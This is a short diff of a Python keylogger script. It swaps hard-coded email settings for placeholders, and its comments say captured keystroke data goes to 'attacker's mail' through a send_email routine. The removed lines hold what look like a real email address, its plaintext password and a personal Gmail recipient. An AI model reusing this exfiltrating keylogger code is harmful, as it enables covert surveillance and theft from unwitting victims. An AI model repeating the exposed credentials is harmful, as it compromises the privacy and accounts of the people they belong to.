@@ -9,10 +9,10 @@ import time
 from PIL import ImageGrab
 
 # Email configuration
-EMAIL_ADDRESS = '2022it0261@svce.ac.in' # email and password we want to recieve keylogger data
-EMAIL_PASSWORD = '11042005@amg#'
-TO_EMAIL = 'arulkrishnan1104@gmail.com' # keylogger data wii be sent to this email
-LOG_FILE = 'C:/Users/91938/Desktop/keyfile.txt'
+EMAIL_ADDRESS = 'user's email address' # email and password we want to recieve keylogger data
+EMAIL_PASSWORD = 'user's password'
+TO_EMAIL = 'attacker's mail' # keylogger data wii be sent to this email
+LOG_FILE = 'directory where keylogged file stored'
 
 def send_email(subject, body, attachment=None):
     msg = MIMEMultipart()
